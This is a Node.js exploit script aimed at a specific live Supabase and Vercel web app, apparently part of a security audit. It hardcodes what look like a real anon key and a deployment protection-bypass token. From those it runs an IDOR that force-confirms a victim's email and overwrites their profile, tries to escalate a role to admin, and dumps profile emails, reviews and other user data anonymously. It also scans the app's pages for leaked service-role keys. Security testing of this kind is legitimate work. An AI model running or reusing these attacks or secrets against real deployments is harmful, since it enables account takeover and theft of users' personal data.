#!/usr/bin/env node
/**
 * Final-most-critical: confirm attacker can confirm victim's email via autoConfirm,
 * and confirm profile data leak via tourists/buddies.
 */

const SUPA = 'https://pqvnjgyqbxlylawwogjv.supabase.co'
const ANON = 'sb_publishable_3uRUZqdvazd4cENt8WOWJA_SB7HmCEE'
const PROD = 'https://localit-p05j9rsln-nhattoann.vercel.app'
const BYPASS = 'w6XAcwiXyFf9Pea8I6zwVONXAhc8Xs9A'

async function req(url, init = {}) {
  const headers = { 'x-vercel-protection-bypass': BYPASS, ...init.headers }
  const r = await fetch(url, { ...init, headers })
  const text = await r.text()
  let json = null
  try { json = JSON.parse(text) } catch {}
  return { status: r.status, text, json }
}

async function main() {
  // CRITICAL: Attacker IDOR via autoConfirm
  console.log('=== C1: Critical IDOR — attacker forces confirm victim email ===')
  const ts = Date.now()
  const vEmail = `victim-${ts}@example.com`
  const v = await req(`${PROD}/api/auth/signup-admin`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email: vEmail, password: 'password123', fullName: 'Real Victim', role: 'tourist' }),
  })
  console.log('victim signup:', v.status, v.text.slice(0, 300))
  const victimId = v.json?.userId
  if (!victimId) {
    console.log('FAIL: no victim userId')
    return
  }

  // Verify the victim is unconfirmed (login fails)
  const preLogin = await req(`${SUPA}/auth/v1/token?grant_type=password`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', apikey: ANON },
    body: JSON.stringify({ email: vEmail, password: 'password123' }),
  })
  console.log('victim pre-login (should fail with email-not-confirmed):', preLogin.status, preLogin.text.slice(0, 200))

  // Attacker (no cookie) calls create-profile with victim's userId + autoConfirm=true
  const attack = await req(`${PROD}/api/auth/create-profile`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      userId: victimId,
      role: 'tourist',
      payload: { nationality: 'PWNED-BY-ATTACKER', travel_style: 'malicious' },
      autoConfirm: true,
    }),
  })
  console.log('attacker autoConfirm:', attack.status, attack.text.slice(0, 400))

  // Verify the email is now confirmed — login should succeed
  const postLogin = await req(`${SUPA}/auth/v1/token?grant_type=password`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', apikey: ANON },
    body: JSON.stringify({ email: vEmail, password: 'password123' }),
  })
  console.log('victim post-login:', postLogin.status, postLogin.text.slice(0, 200))
  if (postLogin.status === 200) {
    console.log('*** CRITICAL: attacker confirmed victim email + overwrote tourist payload ***')
  }

  // 2. Verify the profile leak via profiles
  console.log('\n=== C2: profiles PII leak via anon ===')
  const p = await req(`${SUPA}/rest/v1/profiles?select=*&limit=100`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('profiles count:', p.json?.length, 'sample keys:', p.json?.[0] ? Object.keys(p.json[0]) : '[]')

  // 3. Check reviews and conversations deeper
  console.log('\n=== C3: deeper leak ===')
  const r = await req(`${SUPA}/rest/v1/reviews?select=*&limit=10`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('reviews:', r.status, r.json?.length, 'keys:', r.json?.[0] ? Object.keys(r.json[0]) : '[]')

  // 4. Confirm: Can attacker access service_role key by any side channel?
  // Look for SUPABASE_SERVICE_ROLE_KEY in build output
  console.log('\n=== C4: service role key leak check ===')
  const homeRes = await fetch(PROD)
  const home = await homeRes.text()
  const hasServiceRole = home.includes('SUPABASE_SERVICE_ROLE_KEY') || home.includes('service_role') || home.match(/eyJ[A-Za-z0-9_-]{50,}/g)
  console.log('home contains service_role refs?', hasServiceRole)
  console.log('any JWT-looking strings in home?', home.match(/eyJ[A-Za-z0-9_-]{50,}/g)?.length || 0)

  // 5. Check all API routes for source-map or stack-trace leaks
  console.log('\n=== C5: source map leak ===')
  const js = await fetch(`${PROD}/_next/static/chunks/main-app.js`)
  const jstxt = await js.text()
  console.log('main-app.js status:', js.status, 'size:', jstxt.length)
  console.log('contains sourceMappingURL?', jstxt.includes('sourceMappingURL'))

  // 6. Check what happens when attacker sends role=admin — does the server accept?
  console.log('\n=== C6: role=admin bypass ===')
  const adm = await req(`${PROD}/api/auth/signup`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email: `adm-${Date.now()}@example.com`, password: 'password123', fullName: 'A', role: 'admin' }),
  })
  console.log('role=admin:', adm.status, adm.text.slice(0, 200))

  // 7. Check create-profile role escalation (without autoConfirm, no cookie)
  const adm2 = await req(`${PROD}/api/auth/create-profile`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      userId: 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa',
      role: 'admin',
      payload: {},
      autoConfirm: true,
    }),
  })
  console.log('create-profile role=admin:', adm2.status, adm2.text.slice(0, 400))

  // 8. Check the schema dump — is profiles.role enforced?
  // We can see role column in profile rows by joining tourists via auth user metadata
  console.log('\n=== C8: profiles.email leak ===')
  const allProfiles = await req(`${SUPA}/rest/v1/profiles?select=email,role,full_name&limit=20`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('profiles sample:', JSON.stringify(allProfiles.json?.slice(0, 5), null, 2))

  // 9. Check the trigger — does the on_auth_user_created trigger actually fire?
  // Try signup via API then immediately read profiles
  const t = Date.now()
  const newUser = await req(`${PROD}/api/auth/signup`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email: `trigger-test-${t}@example.com`, password: 'password123', fullName: 'Trigger', role: 'tourist' }),
  })
  console.log('\n=== C9: Trigger check ===')
  console.log('new user signup:', newUser.status, newUser.text.slice(0, 200))
  // Wait a sec and check profiles
  await new Promise(r => setTimeout(r, 1500))
  const newProf = await req(`${SUPA}/rest/v1/profiles?email=eq.trigger-test-${t}@example.com&select=*`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('trigger created profile?', JSON.stringify(newProf.json, null, 2))

  // 10. Final — read ALL data from tourists/buddies/reviews as anon
  console.log('\n=== C10: full data dump size ===')
  const tAll = await req(`${SUPA}/rest/v1/tourists?select=id&limit=1000`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  const bAll = await req(`${SUPA}/rest/v1/buddies?select=id&limit=1000`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  const rAll = await req(`${SUPA}/rest/v1/reviews?select=id&limit=1000`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('tourists count:', tAll.json?.length)
  console.log('buddies count:', bAll.json?.length)
  console.log('reviews count:', rAll.json?.length)
}

main().catch(e => { console.error('FATAL', e); process.exit(1) })